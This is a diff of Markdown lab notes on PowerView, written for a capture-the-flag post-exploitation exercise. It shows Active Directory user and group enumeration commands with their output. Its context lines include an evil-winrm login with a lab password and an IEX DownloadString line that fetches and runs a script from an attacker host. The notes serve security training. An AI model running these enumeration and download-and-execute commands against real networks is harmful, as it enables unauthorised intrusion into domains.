@@ -1,22 +1,21 @@
 # PowerView
 
-### TL;DR
+### [103 functions in PowerView.ps1](#103-functions-in-powerviewps1-1)
 ```
 cat PowerView.ps1 | grep ^funct |nl
+gc .\PowerView.ps1 | sls ^func
 ```
+### [Check specific function in PowerShell script](#check-specific-function-in-powershell-script-1)
 
-### 
-```
-PS C:\> Get-DomainUser
-Exception calling "FindAll" with "0" argument(s): "Unknown error (0x80005000)"
-At C:\PowerView.ps1:5253 char:20
-+             else { $Results = $UserSearcher.FindAll() }
-+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
-    + FullyQualifiedErrorId : COMException
-```
+## [Post-Exploitation Basics](https://tryhackme.com/room/postexploit)
 
-### 
+### [Enumerate the domain users with "Get-NetUser | select cn"](#enumerate-the-domain-users-with-get-netuser--select-cn-1)
+
+### [Enumerate the domain groups with "Get-NetGroup *admin*"](#enumerate-the-domain-groups-with-get-netgroup-admin-1)
+
+### [Useful cheatsheet from HarmJ0y](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+
+
 ```
 
 ```
@@ -27,23 +26,45 @@ At C:\PowerView.ps1:5253 char:20
 ```
 
 ### Examples
+
+### Check specific function in PowerShell script
+```
+PS C:\Users\Administrator\Downloads> gc .\PowerView.ps1 | sls ^func.*Get-NetUser
+
+function Get-NetUser {
 ```
 
+### Enumerate the domain users with "Get-NetUser | select cn"
+```
+PS C:\> Get-NetUser | select cn
+
+cn                  
+--
+Administrator
+Guest
+krbtgt
+Machine-1
+Admin2
+Machine-2
+SQL Service
+POST{P0W3RV13W_FTW}
+ssh
 ```
 
-### 
+### Enumerate the domain groups with "Get-NetGroup *admin*"
+Get-NetGroup -GroupName *admin*
 ```
-
-```
-
-### 
-```
-
-```
-
-### 
-```
-
+PS C:\> Get-NetGroup *admin*
+Administrators 
+Hyper-V Administrators 
+Storage Replica Administrators
+Schema Admins
+Enterprise Admins
+Domain Admins
+Key Admins
+Enterprise Key Admins
+DnsAdmins
+PS C:\>
 ```
 
 ### 
@@ -52,6 +73,7 @@ At C:\PowerView.ps1:5253 char:20
 ```
 
 ### 103 functions in PowerView.ps1
+### gc .\PowerView.ps1 | sls ^func
 ```
 $ cat PowerView.ps1 | grep ^funct |nl
      1  function New-InMemoryModule {
@@ -177,4 +199,16 @@ evil-winrm -i $ip -u svc-alfresco -p s3rvice
 menu
 IEX (New-Object Net.WebClient).DownloadString('http://$myip/PowerView.ps1');
 menu
+```
+
+
+### 
+```
+PS C:\> Get-DomainUser
+Exception calling "FindAll" with "0" argument(s): "Unknown error (0x80005000)"
+At C:\PowerView.ps1:5253 char:20
++             else { $Results = $UserSearcher.FindAll() }
++                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : COMException
 ```
